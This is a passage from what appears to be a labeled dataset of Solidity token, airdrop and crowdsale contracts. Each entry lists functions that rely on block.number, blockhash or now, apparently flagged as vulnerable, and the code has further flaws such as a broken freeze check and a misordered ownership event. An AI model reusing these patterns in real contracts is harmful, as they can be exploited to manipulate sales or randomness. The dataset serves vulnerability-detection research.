end) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n mstore(mc, mload(cc))\n }\n mstore(tempBytes, _length)\n mstore(0x40, and(add(mc, 31), not(31)))\n }\n default {\n tempBytes := mload(0x40)\n mstore(0x40, add(tempBytes, 0x20))\n }\n }\n return tempBytes;\n }\n function toAddress(bytes _bytes, uint _start) internal pure returns (address) {\n require(_bytes.length >= (_start + 20));\n address tempAddress;\n assembly {\n tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)\n }\n return tempAddress;\n }\n function toUint(bytes _bytes, uint _start) internal pure returns (uint256) {\n require(_bytes.length >= (_start + 32));\n uint256 tempUint;\n assembly {\n tempUint := mload(add(add(_bytes, 0x20), _start))\n }\n return tempUint;\n }\n function equal(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bool) {\n bool success = true;\n assembly {\n let length := mload(_preBytes)\n switch eq(length, mload(_postBytes))\n case 1 {\n let cb := 1\n let mc := add(_preBytes, 0x20)\n let end := add(mc, length)\n for {\n let cc := add(_postBytes, 0x20)\n } eq(add(lt(mc, end), cb), 2) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n if iszero(eq(mload(mc), mload(cc))) {\n success := 0\n cb := 0\n }\n }\n }\n default {\n success := 0\n }\n }\n return success;\n }\n function equalStorage(bytes storage _preBytes, bytes memory _postBytes) internal view returns (bool) {\n bool success = true;\n assembly {\n let fslot := sload(_preBytes_slot)\n let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)\n let mlength := mload(_postBytes)\n switch eq(slength, mlength)\n case 1 {\n if iszero(iszero(slength)) {\n switch lt(slength, 32)\n case 1 {\n fslot := mul(div(fslot, 0x100), 0x100)\n if iszero(eq(fslot, mload(add(_postBytes, 0x20)))) {\n success := 0\n }\n }\n default {\n let cb := 1\n mstore(0x0, _preBytes_slot)\n let sc := keccak256(0x0, 0x20)\n let mc := add(_postBytes, 0x20)\n let end := add(mc, mlength)\n for {} eq(add(lt(mc, end), cb), 2) {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } {\n if iszero(eq(sload(sc), mload(mc))) {\n success := 0\n cb := 0\n }\n }\n }\n }\n }\n default {\n success := 0\n }\n }\n return success;\n }\n}",
  "extract_feature": [
    "function dInit(address defaultErc20, address initOwner, bool disableErc20OwnerClaim) only_editors() external returns (bytes32 democHash) {\ndemocHash = keccak256(abi.encodePacked(democList.length, blockhash(block.number-1), defaultErc20, now));\n_addDemoc(democHash, defaultErc20, initOwner, disableErc20OwnerClaim);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b96"
  },
  "filename": "705.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b97"
  },
  "filename": "759.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b98"
  },
  "filename": "762.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public creater;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable(address _owner) public {\n creater = msg.sender;\n if (_owner != 0) {\n owner = _owner;\n }\n else {\n owner = creater;\n }\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier isCreator() {\n require(msg.sender == creater);\n _;\n }\n}\ncontract TravelHelperToken {\n function transfer (address, uint) public pure { }\n function burnTokensForSale() public returns (bool);\n function saleTransfer(address _to, uint256 _value) public returns (bool) {}\n function finalize() public pure { }\n}\ncontract Crowdsale is Ownable {\n using SafeMath for uint256;\n TravelHelperToken public token;\n uint public ethPrice;\n address public wallet;\n uint256 public weiRaised;\n bool public crowdsaleStarted = false;\n uint256 public preIcoCap = uint256(1000000000).mul(1 ether);\n uint256 public icoCap = uint256(1500000000).mul(1 ether);\n uint256 public preIcoTokensSold = 0;\n uint256 public discountedIcoTokensSold = 0;\n uint256 public icoTokensSold = 0;\n uint256 public mainTokensPerDollar = 400 * 1 ether;\n uint256 public totalRaisedInCents;\n uint256 public presaleTokensPerDollar = 533.3333 * 1 ether;\n uint256 public discountedTokensPerDollar = 444.4444 * 1 ether;\n uint256 public hardCapInCents = 525000000;\n uint256 public preIcoStartBlock;\n uint256 public discountedIcoStartBlock;\n uint256 public mainIcoStartBlock;\n uint256 public mainIcoEndBlock;\n uint public preSaleDuration = (7 days)/(15);\n uint public discountedSaleDuration = (15 days)/(15);\n uint public mainSaleDuration = (15 days)/(15);\n modifier CrowdsaleStarted(){\n require(crowdsaleStarted);\n _;\n }\n event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\n function Crowdsale(address _newOwner, address _wallet, TravelHelperToken _token,uint256 _ethPriceInCents) Ownable(_newOwner) public {\n require(_wallet != address(0));\n require(_token != address(0));\n require(_ethPriceInCents > 0);\n wallet = _wallet;\n owner = _newOwner;\n token = _token;\n ethPrice = _ethPriceInCents;\n }\n function startCrowdsale() onlyOwner public returns (bool) {\n require(!crowdsaleStarted);\n crowdsaleStarted = true;\n preIcoStartBlock = block.number;\n discountedIcoStartBlock = block.number + preSaleDuration;\n mainIcoStartBlock = block.number + preSaleDuration + discountedSaleDuration;\n mainIcoEndBlock = block.number + preSaleDuration + discountedSaleDuration + mainSaleDuration;\n }\n function () external payable {\n require(msg.sender != owner);\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) CrowdsaleStarted public payable {\n uint256 weiAmount = msg.value;\n require(weiAmount > 0);\n require(ethPrice > 0);\n uint256 usdCents = weiAmount.mul(ethPrice).div(1 ether);\n uint256 tokens = _getTokenAmount(usdCents);\n _validateTokensLimits(tokens);\n weiRaised = weiRaised.add(weiAmount);\n totalRaisedInCents = totalRaisedInCents.add(usdCents);\n _processPurchase(_beneficiary,tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n _forwardFunds();\n }\n function setEthPriceInDollar(uint _ethPriceInCents) onlyOwner public returns(bool) {\n ethPrice = _ethPriceInCents;\n return true;\n }\n function _validateTokensLimits(uint256 _tokens) internal {\n if (block.number > preIcoStartBlock && block.number < discountedIcoStartBlock) {\n preIcoTokensSold = preIcoTokensSold.add(_tokens);\n require(preIcoTokensSold <= preIcoCap && totalRaisedInCents <= hardCapInCents);\n } else if(block.number >= discountedIcoStartBlock && block.number < mainIcoStartBlock ) {\n require(discountedIcoTokensSold <= icoCap && totalRaisedInCents <= hardCapInCents);\n } else if(block.number >= mainIcoStartBlock && block.number < mainIcoEndBlock ) {\n icoTokensSold = icoTokensSold.add(_tokens);\n require(icoTokensSold <= icoCap && totalRaisedInCents < hardCapInCents);\n } else {\n revert();\n }\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n require(token.saleTransfer(_beneficiary, _tokenAmount));\n }\n function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _getTokenAmount(uint256 _usdCents) CrowdsaleStarted public view returns (uint256) {\n uint256 tokens;\n if (block.number > preIcoStartBlock && block.number < discountedIcoStartBlock ) tokens = _usdCents.div(100).mul(presaleTokensPerDollar);\n if (block.number >= discountedIcoStartBlock && block.number < mainIcoStartBlock ) tokens = _usdCents.div(100).mul(discountedTokensPerDollar);\n if (block.number >= mainIcoStartBlock && block.number < mainIcoEndBlock ) tokens = _usdCents.div(100).mul(mainTokensPerDollar);\n return tokens;\n }\n function getStage() public view returns (string) {\n if(!crowdsaleStarted){\n return 'Crowdsale not started yet';\n }\n if (block.number > preIcoStartBlock && block.number < discountedIcoStartBlock )\n {\n return 'Presale';\n }\n else if (block.number >= discountedIcoStartBlock && block.number < mainIcoStartBlock ) {\n return 'Discounted sale';\n }\n else if (block.number >= mainIcoStartBlock && block.number < mainIcoEndBlock )\n {\n return 'Crowdsale';\n }\n else if(block.number > mainIcoEndBlock)\n {\n return 'Sale ended';\n }\n }\n function burnTokens() public onlyOwner {\n require(block.number > mainIcoEndBlock);\n require(token.burnTokensForSale());\n }\n function finalizeSale() public onlyOwner {\n require(block.number > mainIcoEndBlock);\n token.finalize();\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}",
  "extract_feature": [
    "function startCrowdsale() onlyOwner public returns (bool) {\nrequire(!crowdsaleStarted);\ncrowdsaleStarted = true;\npreIcoStartBlock = block.number;\ndiscountedIcoStartBlock = block.number + preSaleDuration;\nmainIcoStartBlock = block.number + preSaleDuration + discountedSaleDuration;\nmainIcoEndBlock = block.number + preSaleDuration + discountedSaleDuration + mainSaleDuration;\n}",
    "function _validateTokensLimits(uint256 _tokens) internal {\nif (block.number > preIcoStartBlock && block.number < discountedIcoStartBlock) {\npreIcoTokensSold = preIcoTokensSold.add(_tokens);\nrequire(preIcoTokensSold <= preIcoCap && totalRaisedInCents <= hardCapInCents);\n} else if(block.number >= discountedIcoStartBlock && block.number < mainIcoStartBlock ) {\nrequire(discountedIcoTokensSold <= icoCap && totalRaisedInCents <= hardCapInCents);\n} else if(block.number >= mainIcoStartBlock && block.number < mainIcoEndBlock ) {\nicoTokensSold = icoTokensSold.add(_tokens);\nrequire(icoTokensSold <= icoCap && totalRaisedInCents < hardCapInCents);\n} else {\nrevert();\n}\n}",
    "function _getTokenAmount(uint256 _usdCents) CrowdsaleStarted public view returns (uint256) {\nuint256 tokens;\nif (block.number > preIcoStartBlock && block.number < discountedIcoStartBlock ) tokens = _usdCents.div(100).mul(presaleTokensPerDollar);\nif (block.number >= discountedIcoStartBlock && block.number < mainIcoStartBlock ) tokens = _usdCents.div(100).mul(discountedTokensPerDollar);\nif (block.number >= mainIcoStartBlock && block.number < mainIcoEndBlock ) tokens = _usdCents.div(100).mul(mainTokensPerDollar);\nreturn tokens;\n}",
    "function getStage() public view returns (string) {\nif(!crowdsaleStarted){\nreturn 'Crowdsale not started yet';\n}\nif (block.number > preIcoStartBlock && block.number < discountedIcoStartBlock )\n{\nreturn 'Presale';\n}\nelse if (block.number >= discountedIcoStartBlock && block.number < mainIcoStartBlock ) {\nreturn 'Discounted sale';\n}\nelse if (block.number >= mainIcoStartBlock && block.number < mainIcoEndBlock )\n{\nreturn 'Crowdsale';\n}\nelse if(block.number > mainIcoEndBlock)\n{\nreturn 'Sale ended';\n}\n}",
    "function burnTokens() public onlyOwner {\nrequire(block.number > mainIcoEndBlock);\nrequire(token.burnTokensForSale());\n}",
    "function finalizeSale() public onlyOwner {\nrequire(block.number > mainIcoEndBlock);\ntoken.finalize();\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b99"
  },
  "filename": "765.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20 {\n modifier onlyPayloadSize(uint numWords) {\n assert(msg.data.length >= numWords * 32 + 4);\n _;\n }\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Burn(address indexed from, uint256 value);\n event SaleContractActivation(address saleContract, uint256 tokensForSale);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public creater;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable(address _owner) public {\n creater = msg.sender;\n if (_owner != 0) {\n owner = _owner;\n }\n else {\n owner = creater;\n }\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier isCreator() {\n require(msg.sender == creater);\n _;\n }\n}\ncontract StandardToken is ERC20 {\n using SafeMath for uint256;\n mapping (address => mapping (address => uint256)) internal allowed;\n mapping(address => uint256) balances;\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _value) public onlyPayloadSize(2) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0 && balances[_to].add(_value) > balances[_to]) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) public onlyPayloadSize(3) returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public onlyPayloadSize(2) returns (bool) {\n require(_value == 0 && (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function changeApproval(address _spender, uint256 _oldValue, uint256 _newValue) public onlyPayloadSize(3) returns (bool success) {\n require(allowed[msg.sender][_spender] == _oldValue);\n allowed[msg.sender][_spender] = _newValue;\n emit Approval(msg.sender, _spender, _newValue);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function burn(uint256 _value) public returns (bool burnSuccess) {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n emit Burn(burner, _value);\n return true;\n }\n}\ncontract TravelHelperToken is StandardToken, Ownable {\n address public saleContract;\n string public constant name = \"TravelHelperToken\";\n string public constant symbol = \"TRH\";\n uint public constant decimals = 18;\n bool public fundraising = true;\n uint public totalReleased = 0;\n address public teamAddressOne;\n address public teamAddressTwo;\n address public marketingAddress;\n address public advisorsAddress;\n address public teamAddressThree;\n uint public icoStartBlock;\n uint256 public tokensUnlockPeriod = 37 days / 15;\n uint public tokensSupply = 5000000000;\n uint public teamTokens = 1480000000 * 1 ether;\n uint public teamAddressThreeTokens = 20000000 * 1 ether;\n uint public marketingTeamTokens = 500000000 * 1 ether;\n uint public advisorsTokens = 350000000 * 1 ether;\n uint public bountyTokens = 150000000 * 1 ether;\n uint public tokensForSale = 2500000000 * 1 ether;\n uint public releasedTeamTokens = 0;\n uint public releasedAdvisorsTokens = 0;\n uint public releasedMarketingTokens = 0;\n bool public tokensLocked = true;\n Ownable ownable;\n mapping (address => bool) public frozenAccounts;\n event FrozenFund(address target, bool frozen);\n event PriceLog(string text);\n modifier manageTransfer() {\n if (msg.sender == owner) {\n _;\n }\n else {\n require(fundraising == false);\n _;\n }\n }\n modifier tokenNotLocked() {\n if (icoStartBlock > 0 && block.number.sub(icoStartBlock) > tokensUnlockPeriod) {\n tokensLocked = false;\n _;\n } else {\n revert();\n }\n }\n function TravelHelperToken(\n address _tokensOwner,\n address _teamAddressOne,\n address _teamAddressTwo,\n address _marketingAddress,\n address _advisorsAddress,\n address _teamAddressThree) public Ownable(_tokensOwner) {\n require(_tokensOwner != 0x0);\n require(_teamAddressOne != 0x0);\n require(_teamAddressTwo != 0x0);\n teamAddressOne = _teamAddressOne;\n teamAddressTwo = _teamAddressTwo;\n advisorsAddress = _advisorsAddress;\n marketingAddress = _marketingAddress;\n teamAddressThree = _teamAddressThree;\n totalSupply = tokensSupply * (uint256(10) ** decimals);\n }\n function transfer(address _to, uint256 _value) public manageTransfer onlyPayloadSize(2) returns (bool success) {\n require(_to != address(0));\n require(!frozenAccounts[msg.sender]);\n super.transfer(_to,_value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value)\n public\n manageTransfer\n onlyPayloadSize(3) returns (bool)\n {\n require(_to != address(0));\n require(_from != address(0));\n require(!frozenAccounts[msg.sender]);\n super.transferFrom(_from,_to,_value);\n return true;\n }\n function activateSaleContract(address _saleContract) public onlyOwner {\n require(tokensForSale > 0);\n require(teamTokens > 0);\n require(_saleContract != address(0));\n require(saleContract == address(0));\n saleContract = _saleContract;\n uint totalValue = teamTokens.mul(50).div(100);\n balances[teamAddressOne] = balances[teamAddressOne].add(totalValue);\n balances[teamAddressTwo] = balances[teamAddressTwo].add(totalValue);\n balances[advisorsAddress] = balances[advisorsAddress].add(advisorsTokens);\n balances[teamAddressThree] = balances[teamAddressThree].add(teamAddressThreeTokens);\n balances[marketingAddress] = balances[marketingAddress].add(marketingTeamTokens);\n releasedTeamTokens = releasedTeamTokens.add(teamTokens);\n releasedAdvisorsTokens = releasedAdvisorsTokens.add(advisorsTokens);\n releasedMarketingTokens = releasedMarketingTokens.add(marketingTeamTokens);\n balances[saleContract] = balances[saleContract].add(tokensForSale);\n totalReleased = totalReleased.add(tokensForSale).add(teamTokens).add(advisorsTokens).add(teamAddressThreeTokens).add(marketingTeamTokens);\n tokensForSale = 0;\n teamTokens = 0;\n teamAddressThreeTokens = 0;\n icoStartBlock = block.number;\n assert(totalReleased <= totalSupply);\n emit Transfer(address(this), teamAddressOne, totalValue);\n emit Transfer(address(this), teamAddressTwo, totalValue);\n emit Transfer(address(this),teamAddressThree,teamAddressThreeTokens);\n emit Transfer(address(this), saleContract, 2500000000 * 1 ether);\n emit SaleContractActivation(saleContract, 2500000000 * 1 ether);\n }\n function saleTransfer(address _to, uint256 _value) public returns (bool) {\n require(saleContract != address(0));\n require(msg.sender == saleContract);\n return super.transfer(_to, _value);\n }\n function burnTokensForSale() public returns (bool) {\n require(saleContract != address(0));\n require(msg.sender == saleContract);\n uint256 tokens = balances[saleContract];\n require(tokens > 0);\n require(tokens <= totalSupply);\n balances[saleContract] = 0;\n totalSupply = totalSupply.sub(tokens);\n emit Burn(saleContract, tokens);\n return true;\n }\n function finalize() public {\n require(fundraising != false);\n require(msg.sender == saleContract);\n fundraising = false;\n }\n function freezeAccount (address target, bool freeze) public onlyOwner {\n require(target != 0x0);\n require(freeze == (true || false));\n frozenAccounts[target] = freeze;\n emit FrozenFund(target, freeze);\n }\n function sendBounty(address _to, uint256 _value) public onlyOwner returns (bool) {\n uint256 value = _value.mul(1 ether);\n require(bountyTokens >= value);\n totalReleased = totalReleased.add(value);\n require(totalReleased <= totalSupply);\n balances[_to] = balances[_to].add(value);\n bountyTokens = bountyTokens.sub(value);\n emit Transfer(address(this), _to, value);\n return true;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n owner = newOwner;\n emit OwnershipTransferred(owner, newOwner);\n }\n function() public {\n revert();\n }\n}",
  "extract_feature": [
    "function activateSaleContract(address _saleContract) public onlyOwner {\nrequire(tokensForSale > 0);\nrequire(teamTokens > 0);\nrequire(_saleContract != address(0));\nrequire(saleContract == address(0));\nsaleContract = _saleContract;\nuint totalValue = teamTokens.mul(50).div(100);\nbalances[teamAddressOne] = balances[teamAddressOne].add(totalValue);\nbalances[teamAddressTwo] = balances[teamAddressTwo].add(totalValue);\nbalances[advisorsAddress] = balances[advisorsAddress].add(advisorsTokens);\nbalances[teamAddressThree] = balances[teamAddressThree].add(teamAddressThreeTokens);\nbalances[marketingAddress] = balances[marketingAddress].add(marketingTeamTokens);\nreleasedTeamTokens = releasedTeamTokens.add(teamTokens);\nreleasedAdvisorsTokens = releasedAdvisorsTokens.add(advisorsTokens);\nreleasedMarketingTokens = releasedMarketingTokens.add(marketingTeamTokens);\nbalances[saleContract] = balances[saleContract].add(tokensForSale);\ntotalReleased = totalReleased.add(tokensForSale).add(teamTokens).add(advisorsTokens).add(teamAddressThreeTokens).add(marketingTeamTokens);\ntokensForSale = 0;\nteamTokens = 0;\nteamAddressThreeTokens = 0;\nicoStartBlock = block.number;\nassert(totalReleased <= totalSupply);\nemit Transfer(address(this), teamAddressOne, totalValue);\nemit Transfer(address(this), teamAddressTwo, totalValue);\nemit Transfer(address(this),teamAddressThree,teamAddressThreeTokens);\nemit Transfer(address(this), saleContract, 2500000000 * 1 ether);\nemit SaleContractActivation(saleContract, 2500000000 * 1 ether);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6e750a970a4fdc0b9a"
  },
  "filename": "803.sol",
